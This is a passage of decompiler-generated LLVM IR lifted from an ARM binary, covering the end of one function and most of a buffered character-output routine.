  store i32 %v1_11bf4, i32* %r1.global-to-local, align 4
  %v3_11bf8 = icmp ult i32 %v1_11bf4, %v1_11bac
  br i1 %v3_11bf8, label %dec_label_pc_11bb0, label %dec_label_pc_11d00

dec_label_pc_11c04:                               ; preds = %.thread27, %dec_label_pc_11bc0, %dec_label_pc_11b40
  %v0_11c04 = load i32, i32* %fp.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_11c04, 1
  br i1 %tmp154, label %dec_label_pc_11cb0, label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11c04
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_11c24 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %dec_label_pc_11c98, %dec_label_pc_11c0c
  %v9_11c30 = phi i32 [ 0, %dec_label_pc_11c0c ], [ %v1_11c9c, %dec_label_pc_11c98 ]
  %v7_11c14 = icmp sgt i32 %v9_11c30, 2
  br i1 %v7_11c14, label %.thread37, label %bb155

.thread37:                                        ; preds = %dec_label_pc_11c10
  store i32 %v9_11c24, i32* %r3.global-to-local, align 4
  %v10_11c30 = add i32 %v9_11c30, %v9_11c24
  store i32 %v10_11c30, i32* %r1.global-to-local, align 4
  br label %bb156

bb155:                                            ; preds = %dec_label_pc_11c10
  store i32 %v3_1188c.pre-phi, i32* @ip, align 4
  %v12_11c18 = mul i32 %v9_11c30, 4
  %v13_11c18 = add i32 %v12_11c18, %v3_1188c.pre-phi
  store i32 %v13_11c18, i32* %r3.global-to-local, align 4
  %v9_11c20 = add i32 %v13_11c18, -12
  %v10_11c20 = inttoptr i32 %v9_11c20 to i8*
  %v11_11c20 = load i8, i8* %v10_11c20, align 4
  %v12_11c20 = zext i8 %v11_11c20 to i32
  store i32 %v12_11c20, i32* %r2.global-to-local, align 4
  %v9_11c28 = load i32, i32* %r7.global-to-local, align 4
  %v10_11c28 = add i32 %v9_11c28, %v9_11c30
  store i32 %v10_11c28, i32* %r3.global-to-local, align 4
  store i32 %v12_11c20, i32* %r1.global-to-local, align 4
  %v11_11c34 = add i32 %v10_11c28, 36
  %v12_11c34 = inttoptr i32 %v11_11c34 to i8*
  store i8 %v11_11c20, i8* %v12_11c34, align 1
  %v0_11c38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %.thread37, %bb155
  %v0_11c58 = phi i32 [ %v10_11c30, %.thread37 ], [ %v0_11c38.pre, %bb155 ]
  %v1_11c38 = load i32, i32* %fp.global-to-local, align 4
  %v2_11c38 = sub i32 %v0_11c58, %v1_11c38
  %v4_11c38 = xor i32 %v1_11c38, %v0_11c58
  %v5_11c38 = xor i32 %v2_11c38, %v0_11c58
  %v6_11c38 = and i32 %v5_11c38, %v4_11c38
  %v7_11c38 = icmp slt i32 %v6_11c38, 0
  %v8_11c38 = icmp slt i32 %v2_11c38, 0
  %v9_11c38 = icmp eq i32 %v0_11c58, %v1_11c38
  %v3_11c3c = xor i1 %v8_11c38, %v7_11c38
  %v4_11c3c = or i1 %v9_11c38, %v3_11c3c
  br i1 %v4_11c3c, label %dec_label_pc_11c4c, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %bb156
  %v1_11c40 = add i32 %v0_11c58, -9
  %v3_11c40 = sub i32 8, %v0_11c58
  %v4_11c40 = and i32 %v3_11c40, %v0_11c58
  %v5_11c40 = icmp slt i32 %v4_11c40, 0
  %v6_11c40 = icmp slt i32 %v1_11c40, 0
  %v7_11c40 = icmp eq i32 %v0_11c58, 9
  %v3_11c44 = xor i1 %v6_11c40, %v5_11c40
  %v4_11c44 = or i1 %v7_11c40, %v3_11c44
  br i1 %v4_11c44, label %dec_label_pc_11c48, label %dec_label_pc_11d00

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c40
  store i32 %v0_11c58, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11c4c

dec_label_pc_11c4c:                               ; preds = %bb156, %dec_label_pc_11c48
  store i32 %v3_1188c.pre-phi, i32* @r2, align 4
  %v1_11c50 = load i32, i32* %r8.global-to-local, align 4
  %v4_11c50 = mul i32 %v1_11c50, 4
  %v5_11c50 = add i32 %v4_11c50, %v3_1188c.pre-phi
  store i32 %v5_11c50, i32* %sb.global-to-local, align 4
  %v1_11c54 = add i32 %v5_11c50, -40
  %v2_11c54 = inttoptr i32 %v1_11c54 to i32*
  %v3_11c54 = load i32, i32* %v2_11c54, align 4
  store i32 %v3_11c54, i32* %r5.global-to-local, align 4
  %v1_11c58 = add i32 %v0_11c58, -1
  store i32 %v1_11c58, i32* %r3.global-to-local, align 4
  %v0_11c5c = load i32, i32* %r7.global-to-local, align 4
  %v4_11c5c = mul i32 %v1_11c58, 4
  %v5_11c5c = add i32 %v0_11c5c, %v4_11c5c
  store i32 %v5_11c5c, i32* %sl.global-to-local, align 4
  %v7_11c60 = icmp eq i32 %v3_11c54, 8
  %v1_11c64 = add i32 %v5_11c5c, 40
  %v2_11c64 = inttoptr i32 %v1_11c64 to i32*
  %v3_11c64 = load i32, i32* %v2_11c64, align 4
  store i32 %v3_11c64, i32* @r0, align 4
  br i1 %v7_11c60, label %dec_label_pc_11c98, label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c4c
  %v9_11c6c = icmp eq i32 %v3_11c64, %v3_11c54
  br i1 %v9_11c6c, label %dec_label_pc_11c90, label %bb157

bb157:                                            ; preds = %dec_label_pc_11c6c
  %v8_11c70 = icmp eq i32 %v3_11c64, 8
  br i1 %v8_11c70, label %dec_label_pc_11c90, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %bb157
  %v0_11c78 = call i32 @function_1177c()
  %v0_11c80 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11c80, i32* @r0, align 4
  %v0_11c84 = call i32 @function_1177c()
  store i32 %v0_11c84, i32* %r0.global-to-local, align 4
  %v8_11c8c = icmp sgt i32 %v0_11c78, %v0_11c84
  br i1 %v8_11c8c, label %dec_label_pc_11c98, label %dec_label_pc_11c78.dec_label_pc_11c90_crit_edge

dec_label_pc_11c78.dec_label_pc_11c90_crit_edge:  ; preds = %dec_label_pc_11c78
  %v0_11c90.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_11c94.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11c90

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11c78.dec_label_pc_11c90_crit_edge, %dec_label_pc_11c6c, %bb157
  %v1_11c94 = phi i32 [ %v1_11c94.pre, %dec_label_pc_11c78.dec_label_pc_11c90_crit_edge ], [ %v5_11c5c, %dec_label_pc_11c6c ], [ %v5_11c5c, %bb157 ]
  %v0_11c90 = phi i32 [ %v0_11c90.pre, %dec_label_pc_11c78.dec_label_pc_11c90_crit_edge ], [ %v5_11c50, %dec_label_pc_11c6c ], [ %v5_11c50, %bb157 ]
  %v1_11c90 = add i32 %v0_11c90, -40
  %v2_11c90 = inttoptr i32 %v1_11c90 to i32*
  %v3_11c90 = load i32, i32* %v2_11c90, align 4
  store i32 %v3_11c90, i32* %r3.global-to-local, align 4
  %v2_11c94 = add i32 %v1_11c94, 40
  %v3_11c94 = inttoptr i32 %v2_11c94 to i32*
  store i32 %v3_11c90, i32* %v3_11c94, align 4
  br label %dec_label_pc_11c98

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c78, %dec_label_pc_11c4c, %dec_label_pc_11c90
  %v0_11c98 = load i32, i32* %r7.global-to-local, align 4
  %v1_11c98 = add i32 %v0_11c98, 28
  %v2_11c98 = inttoptr i32 %v1_11c98 to i32*
  %v3_11c98 = load i32, i32* %v2_11c98, align 4
  %v0_11c9c = load i32, i32* %r8.global-to-local, align 4
  %v1_11c9c = add i32 %v0_11c9c, 1
  store i32 %v1_11c9c, i32* %r8.global-to-local, align 4
  %v1_11ca0 = add i32 %v3_11c98, 2
  store i32 %v1_11ca0, i32* %r3.global-to-local, align 4
  %v6_11ca8 = icmp slt i32 %v1_11c9c, %v1_11ca0
  br i1 %v6_11ca8, label %dec_label_pc_11c10, label %dec_label_pc_11ccc

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11c04
  %v0_11cb0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11cb0 = add i32 %v0_11cb0, 28
  %v2_11cb0 = inttoptr i32 %v1_11cb0 to i32*
  %v3_11cb0 = load i32, i32* %v2_11cb0, align 4
  store i32 %v3_11cb0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_11cb8 = add i32 %v0_11cb0, 38
  %v4_11cb8 = inttoptr i32 %v3_11cb8 to i8*
  store i8 1, i8* %v4_11cb8, align 1
  %v0_11cbc = load i32, i32* %r2.global-to-local, align 4
  %v3_11cbc = mul i32 %v0_11cbc, 4
  store i32 %v3_11cbc, i32* @r2, align 4
  %v0_11cc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11cc0 = add i32 %v0_11cc0, 40
  store i32 %v1_11cc0, i32* @r0, align 4
  %v2_11cc4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_11cc4, i32* @r1, align 4
  %v0_11cc8 = call i32 @function_12050()
  store i32 %v0_11cc8, i32* %r0.global-to-local, align 4
  %v0_11ccc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11c98, %dec_label_pc_11cb0
  %v2_11ce8 = phi i32 [ %v0_11ccc.pre, %dec_label_pc_11cb0 ], [ %v0_11c98, %dec_label_pc_11c98 ]
  %v1_11ccc = add i32 %v2_11ce8, 16
  %v2_11ccc = inttoptr i32 %v1_11ccc to i32*
  %v3_11ccc = load i32, i32* %v2_11ccc, align 4
  store i32 %v3_11ccc, i32* %r3.global-to-local, align 4
  %v1_11cd0 = and i32 %v3_11ccc, 128
  %v2_11cd0 = icmp eq i32 %v1_11cd0, 0
  br i1 %v2_11cd0, label %.thread49, label %.thread47

.thread47:                                        ; preds = %dec_label_pc_11ccc
  %v3_11cd4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_11cd4, i32* %r3.global-to-local, align 4
  %v2_11cd8 = inttoptr i32 %v2_11ce8 to i32*
  %v3_11cd8 = load i32, i32* %v2_11cd8, align 4
  %v2_11ce0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11ce0 = sub i32 %v2_11ce0.pre, %v3_11cd4
  store i32 %v3_11ce0, i32* %r3.global-to-local, align 4
  %v5_11ce4 = mul i32 %v3_11ce0, 4
  %v6_11ce4 = add i32 %v5_11ce4, %v3_11cd8
  store i32 %v6_11ce4, i32* @r2, align 4
  br label %bb158

.thread49:                                        ; preds = %dec_label_pc_11ccc
  %v1_11cdc44 = load i32, i32* %r6.global-to-local, align 4
  %v2_11cdc45 = add i32 %v1_11cdc44, 1
  store i32 %v2_11cdc45, i32* %r3.global-to-local, align 4
  %v3_11ce8 = inttoptr i32 %v2_11ce8 to i32*
  store i32 %v2_11cdc45, i32* %v3_11ce8, align 4
  %v0_11cec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread47, %.thread49
  %v1_11cf4 = phi i32 [ %v2_11ce8, %.thread47 ], [ %v0_11cec.pre, %.thread49 ]
  %v1_11cec = add i32 %v1_11cf4, 28
  %v2_11cec = inttoptr i32 %v1_11cec to i32*
  %v3_11cec = load i32, i32* %v2_11cec, align 4
  store i32 %v3_11cec, i32* %r3.global-to-local, align 4
  %v1_11cf0 = add i32 %v3_11cec, 2
  store i32 %v1_11cf0, i32* %r0.global-to-local, align 4
  %v0_11cf4 = load i32, i32* %fp.global-to-local, align 4
  %v2_11cf4 = add i32 %v1_11cf4, 24
  %v3_11cf4 = inttoptr i32 %v2_11cf4 to i32*
  store i32 %v0_11cf4, i32* %v3_11cf4, align 4
  br i1 %v2_11cd0, label %dec_label_pc_11d04, label %bb159

bb159:                                            ; preds = %bb158
  %v1_11cf8 = load i32, i32* @r2, align 4
  %v2_11cf8 = load i32, i32* %r7.global-to-local, align 4
  %v3_11cf8 = inttoptr i32 %v2_11cf8 to i32*
  store i32 %v1_11cf8, i32* %v3_11cf8, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11814, %dec_label_pc_1195c, %dec_label_pc_11a08, %dec_label_pc_119e0, %dec_label_pc_11928, %dec_label_pc_119ec, %dec_label_pc_11c40, %dec_label_pc_11bc0, %.thread23
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %bb159, %bb158, %dec_label_pc_11d00
  %v2_11d08 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11d08, i32* @r4, align 4
  store i32 %v6_117d0, i32* @r5, align 4
  store i32 %v27_117d0, i32* @lr, align 4
  %v1_11d0c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_11d0c

; uselistorder directives
  uselistorder i32 %v3_11ce0, { 1, 0 }
  uselistorder i32 %v1_11c9c, { 1, 2, 0 }
  uselistorder i32 %v2_11c38, { 1, 0 }
  uselistorder i32 %v1_11c38, { 1, 0, 2 }
  uselistorder i32 %v0_11c58, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_11c30, { 0, 2, 1, 3 }
  uselistorder i32 %v1_11bf4, { 1, 2, 0 }
  uselistorder i32 %v0_11be4, { 1, 0 }
  uselistorder i32 %v1_11bc0, { 1, 0, 2 }
  uselistorder i32 %v1_11b34, { 1, 2, 0 }
  uselistorder i32 %v1_11b1c, { 1, 0 }
  uselistorder i32 %v2_11b04, { 2, 1, 0 }
  uselistorder i32 %v1_11ae8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11ac4, { 1, 0, 2 }
  uselistorder i32 %v3_11aa0, { 2, 1, 0 }
  uselistorder i32 %v1_11a60, { 0, 2, 3, 1 }
  uselistorder i32 %v0_11a50.pre, { 0, 2, 1 }
  uselistorder i32 %v2_11a2c, { 1, 0 }
  uselistorder i32 %v5_1198c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1198c, { 1, 0 }
  uselistorder i32 %v0_1199074, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_11934, { 1, 0 }
  uselistorder i32 %v0_11954, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_11918, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11900, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_118f0, { 1, 0 }
  uselistorder i32 %v3_118e8, { 0, 2, 1 }
  uselistorder i8 %v2_118e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11968, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_118ac, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_11898, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11880, { 1, 0 }
  uselistorder i32 %v3_1188c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_11834, { 0, 2, 1 }
  uselistorder i32 %v2_11820, { 1, 0, 2 }
  uselistorder i32 %v0_117d4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %sb.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 4, 8, 6, 7, 5, 0 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 0, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 11, 9, 13, 10, 5, 6, 12, 7, 14, 8, 16, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 6, 7, 4, 1, 2, 0, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 18, 17, 8, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 0, 1, 2, 35, 3, 6, 7, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r2.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 9, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 27, 28, 26, 25, 29, 30, 31, 0, 5, 1, 6, 7, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 11, 12, 10, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 2, 3, 4, 24, 25, 5, 6, 8, 9, 7, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 7, 9, 8, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @function_1177c, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1a6fc.232 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1a698.230 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_11d04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d00, { 7, 0, 8, 9, 3, 6, 4, 2, 5, 1 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_11ccc, { 1, 0 }
  uselistorder label %dec_label_pc_11c98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c90, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11c4c, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_11c04, { 1, 0, 2 }
  uselistorder label %bb150, { 2, 1, 0 }
  uselistorder label %.thread23, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a18, { 1, 0 }
  uselistorder label %dec_label_pc_119cc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11948, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11944, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_118e4, { 1, 0 }
  uselistorder label %dec_label_pc_118e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11884, { 1, 0 }
  uselistorder label %dec_label_pc_11858, { 1, 0 }
}

define i32 @function_11d40(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d40:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_11d40 = load i32, i32* @r4, align 4
  store i32 %v3_11d40, i32* %stack_var_-12, align 4
  %v2_11d44 = add i32 %arg2, 16
  %v3_11d44 = inttoptr i32 %v2_11d44 to i32*
  %v4_11d44 = load i32, i32* %v3_11d44, align 4
  store i32 %v4_11d44, i32* @r2, align 4
  %v2_11d48 = add i32 %arg2, 28
  %v3_11d48 = inttoptr i32 %v2_11d48 to i32*
  %v4_11d48 = load i32, i32* %v3_11d48, align 4
  store i32 %v4_11d48, i32* %r3.global-to-local, align 4
  %v3_11d4c = icmp uge i32 %v4_11d44, %v4_11d48
  store i1 %v3_11d4c, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_11d58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d58, i32* @r5, align 4
  br i1 %v3_11d4c, label %dec_label_pc_11d70, label %.thread

.thread:                                          ; preds = %dec_label_pc_11d40
  %v2_11d5c = urem i32 %v0_11d58, 256
  store i32 %v2_11d5c, i32* %r3.global-to-local, align 4
  %v2_11d60 = trunc i32 %v0_11d58 to i8
  %v4_11d60 = inttoptr i32 %v4_11d44 to i8*
  store i8 %v2_11d60, i8* %v4_11d60, align 1
  %v5_11d60 = load i32, i32* @r2, align 4
  %v6_11d60 = add i32 %v5_11d60, 1
  store i32 %v6_11d60, i32* @r2, align 4
  %v0_11d64.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11d64.pr.pr, label %dec_label_pc_11d70, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_11d64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11d64, i32* %r0.global-to-local, align 4
  store i32 %v6_11d60, i32* %v3_11d44, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11d70:                               ; preds = %dec_label_pc_11d40, %.thread
  %v3_11d70 = load i16, i16* %tmp, align 2
  %v4_11d70 = zext i16 %v3_11d70 to i32
  %v1_11d74 = and i32 %v4_11d70, 192
  store i32 %v1_11d74, i32* %r3.global-to-local, align 4
  %v2_11d78 = icmp eq i32 %v1_11d74, 192
  store i1 %v2_11d78, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_11d78, label %dec_label_pc_11d94, label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d70
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_11d88 = call i32 @function_162c0(i16* nonnull %tmp, i32 128)
  store i32 %v4_11d88, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d8c = icmp eq i32 %v4_11d88, 0
  br i1 %v2_11d8c, label %dec_label_pc_11d94, label %dec_label_pc_11e38

dec_label_pc_11d94:                               ; preds = %dec_label_pc_11d80, %dec_label_pc_11d70
  %v0_11d94 = load i32, i32* @r4, align 4
  %v1_11d94 = add i32 %v0_11d94, 4
  %v2_11d94 = inttoptr i32 %v1_11d94 to i32*
  %v3_11d94 = load i32, i32* %v2_11d94, align 4
  store i32 %v3_11d94, i32* %r3.global-to-local, align 4
  %v2_11d98 = icmp ugt i32 %v3_11d94, -3
  store i1 %v2_11d98, i1* %cpsr_c.global-to-local, align 1
  %v7_11d98 = icmp eq i32 %v3_11d94, -2
  br i1 %v7_11d98, label %dec_label_pc_11e30, label %dec_label_pc_11da0

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d94
  %v1_11da0 = add i32 %v0_11d94, 12
  %v2_11da0 = inttoptr i32 %v1_11da0 to i32*
  %v3_11da0 = load i32, i32* %v2_11da0, align 4
  store i32 %v3_11da0, i32* %r2.global-to-local, align 4
  %v1_11da4 = add i32 %v0_11d94, 8
  %v2_11da4 = inttoptr i32 %v1_11da4 to i32*
  %v3_11da4 = load i32, i32* %v2_11da4, align 4
  store i32 %v3_11da4, i32* %r3.global-to-local, align 4
  %v3_11da8 = icmp uge i32 %v3_11da0, %v3_11da4
  store i1 %v3_11da8, i1* %cpsr_c.global-to-local, align 1
  %v9_11da8 = icmp eq i32 %v3_11da0, %v3_11da4
  br i1 %v9_11da8, label %dec_label_pc_11e14, label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11da0
  %v1_11db0 = add i32 %v0_11d94, 16
  %v2_11db0 = inttoptr i32 %v1_11db0 to i32*
  %v3_11db0 = load i32, i32* %v2_11db0, align 4
  store i32 %v3_11db0, i32* %r3.global-to-local, align 4
  %v3_11db4 = icmp uge i32 %v3_11da0, %v3_11db0
  store i1 %v3_11db4, i1* %cpsr_c.global-to-local, align 1
  %v9_11db4 = icmp eq i32 %v3_11da0, %v3_11db0
  br i1 %v9_11db4, label %dec_label_pc_11dbc, label %dec_label_pc_11dcc

dec_label_pc_11dbc:                               ; preds = %dec_label_pc_11db0
  store i32 %v0_11d94, i32* @r0, align 4
  %v0_11dc0 = call i32 @function_10c14()
  store i32 %v0_11dc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11dc4 = icmp eq i32 %v0_11dc0, 0
  br i1 %v2_11dc4, label %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge, label %dec_label_pc_11e38

dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge:  ; preds = %dec_label_pc_11dbc
  %v0_11dcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dcc:                               ; preds = %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge, %dec_label_pc_11db0
  %v0_11dcc = phi i32 [ %v0_11dcc.pre, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge ], [ %v0_11d94, %dec_label_pc_11db0 ]
  %v1_11dcc = add i32 %v0_11dcc, 16
  %v2_11dcc = inttoptr i32 %v1_11dcc to i32*
  %v3_11dcc = load i32, i32* %v2_11dcc, align 4
  store i32 %v3_11dcc, i32* %r2.global-to-local, align 4
  %v0_11dd0 = load i32, i32* @r5, align 4
  %v1_11dd0 = urem i32 %v0_11dd0, 256
  store i32 %v1_11dd0, i32* %r1.global-to-local, align 4
  %v1_11dd4 = trunc i32 %v0_11dd0 to i8
  %v3_11dd4 = inttoptr i32 %v3_11dcc to i8*
  store i8 %v1_11dd4, i8* %v3_11dd4, align 1
  %v4_11dd4 = load i32, i32* %r2.global-to-local, align 4
  %v5_11dd4 = add i32 %v4_11dd4, 1
  store i32 %v5_11dd4, i32* @r2, align 4
  %v0_11dd8 = load i32, i32* @r4, align 4
  %v1_11dd8 = inttoptr i32 %v0_11dd8 to i16*
  %v2_11dd8 = load i16, i16* %v1_11dd8, align 2
  %v3_11dd8 = zext i16 %v2_11dd8 to i32
  store i32 %v3_11dd8, i32* %r3.global-to-local, align 4
  %v1_11ddc = and i32 %v3_11dd8, 256
  %v2_11ddc = icmp eq i32 %v1_11ddc, 0
  %v2_11de0 = add i32 %v0_11dd8, 16
  %v3_11de0 = inttoptr i32 %v2_11de0 to i32*
  store i32 %v5_11dd4, i32* %v3_11de0, align 4
  br i1 %v2_11ddc, label %dec_label_pc_11e30, label %dec_label_pc_11de8

dec_label_pc_11de8:                               ; preds = %dec_label_pc_11dcc
  %v0_11de8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11de8 = icmp ugt i32 %v0_11de8, 9
  store i1 %v2_11de8, i1* %cpsr_c.global-to-local, align 1
  %v7_11de8 = icmp eq i32 %v0_11de8, 10
  br i1 %v7_11de8, label %dec_label_pc_11df0, label %dec_label_pc_11e30

dec_label_pc_11df0:                               ; preds = %dec_label_pc_11de8
  %v0_11df0 = load i32, i32* @r4, align 4
  store i32 %v0_11df0, i32* @r0, align 4
  %v0_11df4 = call i32 @function_10c14()
  store i32 %v0_11df4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11df8 = icmp eq i32 %v0_11df4, 0
  br i1 %v2_11df8, label %dec_label_pc_11e30, label %dec_label_pc_11e00

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11df0
  %v0_11e00 = load i32, i32* @r4, align 4
  %v1_11e00 = add i32 %v0_11e00, 16
  %v2_11e00 = inttoptr i32 %v1_11e00 to i32*
  %v3_11e00 = load i32, i32* %v2_11e00, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_11e08 = add i32 %v3_11e00, -1
  store i32 %v1_11e08, i32* %r3.global-to-local, align 4
  store i32 %v1_11e08, i32* %v2_11e00, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e14:                               ; preds = %dec_label_pc_11da0
  %v0_11e18 = load i32, i32* @r5, align 4
  %v6_11e18 = trunc i32 %v0_11e18 to i8
  store i8 %v6_11e18, i8* %stack_var_-17, align 1
  %v9_11e18 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v9_11e18, i32* %r1.global-to-local, align 4
  %v1_11e1c = inttoptr i32 %v0_11d94 to i16*
  store i32 %v0_11d94, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11e24 = call i32 @function_15dc4(i16* %v1_11e1c, i32 %v9_11e18, i32 1)
  store i32 %v5_11e24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11e28 = icmp eq i32 %v5_11e24, 0
  br i1 %v2_11e28, label %dec_label_pc_11e38, label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11de8, %dec_label_pc_11e14, %dec_label_pc_11df0, %dec_label_pc_11dcc, %dec_label_pc_11d94
  %v0_11e30 = load i32, i32* @r5, align 4
  %v1_11e30 = urem i32 %v0_11e30, 256
  store i32 %v1_11e30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11dbc, %dec_label_pc_11d80, %dec_label_pc_11e14
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e3c

